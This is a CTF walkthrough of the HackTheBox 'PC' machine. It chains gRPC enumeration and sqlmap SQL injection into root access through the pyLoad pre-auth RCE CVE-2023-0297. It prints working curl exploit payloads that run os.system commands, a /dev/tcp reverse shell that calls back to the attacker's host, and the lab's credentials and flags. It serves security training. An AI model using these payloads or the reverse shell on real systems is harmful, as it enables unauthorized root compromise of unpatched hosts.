# HackTheBox — PC

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: grpc, sqli, cve, pyload](https://img.shields.io/badge/Tags-gRPC%20%7C%20SQLi%20%7C%20CVE%20%7C%20pyLoad-orange)

> **TL;DR** — Only port `50051` is exposed (gRPC). Use `grpcui` to enumerate methods, register a user, intercept a JWT-bearing call in Burp, save the request, and feed it to `sqlmap` — it dumps `sau`'s creds. SSH in for `user.txt`. Locally, `pyLoad 0.5.0` runs on `127.0.0.1:8000` (and `:9666`); forward the port and exploit **CVE-2023-0297** (pre-auth RCE via the `jk` parameter in `/flash/addcrypted2`) to drop a SUID `bash` and own root.

---

## Attack Chain at a Glance

```
nmap → 50051/tcp gRPC → grpcui → register user, getInfo with JWT
   → Burp captures the call → save request → sqlmap → sau:HereIsYourPassWord1431
   → SSH as sau → user.txt
   → ss -tln reveals 127.0.0.1:8000 (pyLoad 0.5.0) → ssh -L tunnel
   → CVE-2023-0297 → cp /bin/bash /tmp/bash + chmod +s → /tmp/bash -p → root.txt
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Foothold — gRPC + SQLi](#initial-foothold--grpc--sqli)
- [User Flag](#user-flag)
- [Local Enumeration & Port Forwarding](#local-enumeration--port-forwarding)
- [Privilege Escalation — CVE-2023-0297 (pyLoad)](#privilege-escalation--cve-2023-0297-pyload)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.10.11.214
```

<details>
<summary>Click to expand</summary>

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
```

Plus a binary fingerprint nmap can't identify.

</details>

| Port  | Service | Notes |
|-------|---------|-------|
| 22    | SSH     | OpenSSH 8.2p1 |
| 50051 | ?       | nmap can't identify — but 50051 is gRPC's de-facto default |

> 💡 **Port 50051 → gRPC.** Google's gRPC reference servers ship listening on 50051 by default, so a quick search on the port number is enough to pivot. The `\0\0\x18\x04` magic bytes in the fingerprint are HTTP/2 frames, which gRPC uses as its transport.

---

## Initial Foothold — gRPC + SQLi

### Interacting with gRPC

The standard tool is [`grpcui`](https://github.com/fullstorydev/grpcui):

```bash
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
~/go/bin/grpcui -plaintext 10.10.11.214:50051
```

This opens a browser-based UI listing every available method.

### Method Enumeration

The service exposes:
- `RegisterUser(username, password)` → no-op return
- `LoginUser(username, password)` → returns `id` + JWT-style token
- `getInfo(id)` → requires the token in metadata

Register a user, log in, and capture the response. The token looks like:

```
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlciIsImV4cCI6MTY4NzYyNDY0M30.Tjq5Bjt0qJDkyBvaIz9JU8T_1NgyX-ZfMtpun8o4X4E'
```

> ⚠️ Strip the Python bytes wrapper — drop the leading `b'` and trailing `'`. The actual JWT is just:
> ```
> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlciIsImV4cCI6MTY4NzYyNDY0M30.Tjq5Bjt0qJDkyBvaIz9JU8T_1NgyX-ZfMtpun8o4X4E
> ```

### Pivoting to SQLi

Defaults of `admin:admin` work — meaning there's a user database backing this service. Time to test for SQLi.

**Approach:**

1. Configure Burp as `grpcui`'s upstream proxy.
2. Issue a `getInfo` call with the token in metadata.
3. Send the captured request to Repeater.
4. Save it as `sqli.req`.
5. Run sqlmap:

```bash
sqlmap -r sqli.req --dump
```

Accept all defaults. The dump:

```
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

---

## User Flag

```bash
ssh sau@10.10.11.214
# password: HereIsYourPassWord1431
cat ~/user.txt
```

🚩 **User flag captured.**

---

## Local Enumeration & Port Forwarding

```bash
sau@pc:~$ ss -tln
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
LISTEN   0        128              0.0.0.0:9666           0.0.0.0:*
LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN   0        128              0.0.0.0:22             0.0.0.0:*
LISTEN   0        5              127.0.0.1:8000           0.0.0.0:*
LISTEN   0        4096                   *:50051                *:*
LISTEN   0        128                 [::]:22                [::]:*
```

`127.0.0.1:8000` is bound but not reachable from the network. Forward it via SSH:

```bash
ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
```

Now `http://127.0.0.1:8000` in your browser shows **pyLoad**.

> 💡 Port `9666` is also pyLoad and is exposed externally — you can target it directly without forwarding if you prefer. Both work for the next step.

```bash
sau@pc:~$ pyload --version
pyLoad 0.5.0
```

---

## Privilege Escalation — CVE-2023-0297 (pyLoad)

[CVE-2023-0297 PoC](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad): pre-auth RCE in pyLoad's `/flash/addcrypted2` endpoint via the `jk` parameter, which is `eval()`'d as Python (the `pyimport` directive smuggles `import os`).

### Confirming the Vulnerability

```bash
curl -i -s -k -X POST \
    --data-binary 'jk=pyimport%20os;os.system("touch%20/tmp/vulnerable");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    'http://127.0.0.1:8000/flash/addcrypted2'
```

```bash
sau@pc:~$ ls -la /tmp/vulnerable
-rw-r--r-- 1 root root 0 Jun 24 16:30 /tmp/vulnerable
```

Owner is `root` → the pyLoad service is running as root.

### Option 1 — SUID bash

Copy `bash` and SUID it:

```bash
# Copy
curl -i -s -k -X POST \
    --data-binary 'jk=pyimport%20os;os.system("cp%20%2Fbin%2Fbash%20%2Ftmp%2Fbash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    'http://127.0.0.1:8000/flash/addcrypted2'

# SUID it
curl -i -s -k -X POST \
    --data-binary 'jk=pyimport%20os;os.system("chmod%20%2Bs%20%2Ftmp%2Fbash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    'http://127.0.0.1:8000/flash/addcrypted2'
```

Result:

```
-rwsr-sr-x  1 root root 1.2M Jun 24 16:30 /tmp/bash
```

```bash
sau@pc:~$ /tmp/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
7cdafb751e49f327563e10f6e55381e5
```

### Option 2 — Reverse Shell

Pre-stage `/tmp/shell.sh` as `sau`:

```bash
cat > /tmp/shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
EOF
chmod +x /tmp/shell.sh
```

Listener on attacker:

```bash
nc -nvlp 9001
```

Trigger:

```bash
curl -i -s -k -X POST \
    --data-binary 'jk=pyimport%20os;os.system("bash%20/tmp/shell.sh");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    'http://127.0.0.1:8000/flash/addcrypted2'
```

> 💡 pyLoad's data dir is at `/root/.pyload/data` — useful to remember if you need to pivot further or if a future pyLoad CTF needs config files.

---

## Root Flag

```
04c9c7c38d59a436b8d3ac261a10e70e
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **Unknown ports often have well-known default services.** `50051 = gRPC`, `5000 = Flask`, `8000 = pyLoad / Django dev`, `8888 = Jupyter`. Look up the port number before fingerprinting deeper.
- **gRPC services need their own tooling.** `nmap` can identify HTTP/2 but not the methods; `grpcui` (or `grpcurl`) is the equivalent of `Postman` for protobuf services.
- **Burp+sqlmap still works on gRPC.** The transport is binary, but the *parameters* are still structured data. Capturing one valid request and feeding it to sqlmap covers the SQLi case fine.
- **Internal-only ports become external when you have SSH.** `ss -tln` then `ssh -L` is the bread-and-butter pivot.
- **URL-encode payload special chars inside `--data-binary`.** Forgetting this is the #1 reason CVE-2023-0297 PoCs "don't work" for people — the `;`, `%20`, and quote characters all matter.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port discovery |
| [`grpcui`](https://github.com/fullstorydev/grpcui) | Browser-based gRPC client |
| [Burp Suite](https://portswigger.net/burp) | Intercepting `grpcui` traffic to capture requests |
| [`sqlmap`](https://sqlmap.org/) | Automated SQLi against the captured `getInfo` request |
| [CVE-2023-0297 PoC](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad) | pyLoad pre-auth RCE |
